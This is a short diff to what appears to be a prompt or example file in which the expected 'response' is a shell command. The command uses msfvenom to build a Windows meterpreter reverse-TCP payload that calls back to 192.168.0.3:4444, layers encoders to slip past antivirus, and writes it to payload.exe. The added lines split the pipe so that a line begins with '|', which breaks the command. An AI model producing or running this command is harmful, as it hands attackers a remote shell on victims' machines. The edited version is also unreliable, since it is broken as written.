@@ -90,5 +90,6 @@ return Response(content=res.stdout.decode("utf-8"), media_type="text/plain")
 ```
  Your response: 
 ```bash
-./msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.3 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | ./msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f exe -o payload.exe
+./msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.3 lport=4444 -f raw -e x86/shikata_ga_nai -i 5
+| ./msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f exe -o payload.exe
 ```
